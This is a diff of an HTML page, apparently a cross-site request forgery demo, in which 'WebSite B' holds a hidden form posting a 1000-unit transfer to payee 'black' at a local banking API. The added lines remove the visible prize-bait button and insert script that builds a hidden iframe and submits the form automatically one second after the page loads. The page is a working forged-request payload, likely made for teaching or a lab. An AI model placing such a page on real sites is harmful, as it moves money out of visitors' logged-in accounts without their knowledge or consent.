@@ -7,11 +7,20 @@
   <body>
     <h2>Welcome to WebSite B</h2>
 
-    <form name="form" action="http://www.a.com/api/users/transfer" method="post">
-      <input name="payee" value="black" />
-      <input name="amount" value="1000" />
-      <button>点我拿100万大奖</button>
+    <form name="form" target="csrf" method="post" action="http://127.0.0.1:6001/api/users/transfer">
+      <input name="payee" type="hidden" value="black">
+      <input name="amount" type="hidden" value="1000">
     </form>
-    <!-- <iframe src="/csrf.html"></iframe> -->
   </body>
+
+  <script>
+			const iframe = document.createElement('iframe');
+			iframe.name = 'csrf';
+			iframe.style.display = 'none';
+			document.body.appendChild(iframe);
+
+			setTimeout(() => {
+				document.querySelector('[name=form]').submit();
+			}, 1000);
+  </script>
 </html>
